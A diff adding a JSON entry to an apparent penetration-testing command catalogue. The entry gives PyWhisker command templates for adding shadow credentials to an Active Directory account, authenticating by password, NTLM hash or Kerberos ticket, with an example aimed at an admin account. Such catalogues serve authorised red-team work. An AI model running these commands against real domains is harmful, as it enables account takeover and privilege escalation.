@@ -1,0 +1,35 @@
+{
+  "id": "pywhisker",
+  "name": "PyWhisker Shadow Credentials",
+  "command": "python3 pywhisker.py -d '<domain>' -u '<user>' -p '<password>' --target '<target_user>' --action add --dc-ip <ip>",
+  "description": "Add shadow credentials to a target account's msDS-KeyCredentialLink attribute",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "ldap"
+  ],
+  "tags": [
+    "pywhisker",
+    "shadow-credentials",
+    "msds-keycredentiallink",
+    "delegation",
+    "pkinit"
+  ],
+  "variations": [
+    {
+      "label": "NTLM Hash",
+      "requires": "hash",
+      "command": "python3 pywhisker.py -d '<domain>' -u '<user>' --hashes ':<hash>' --target '<target_user>' --action add --dc-ip <ip>"
+    },
+    {
+      "label": "Kerberos Ticket",
+      "requires": "ticket",
+      "command": "python3 pywhisker.py -d '<domain>' -u '<user>' -k --target '<target_user>' --action add --dc-ip <ip>"
+    }
+  ],
+  "examples": [
+    "python3 pywhisker.py -d 'corp.local' -u 'user' -p 'password' --target 'admin' --action add --dc-ip 192.168.1.100"
+  ]
+}
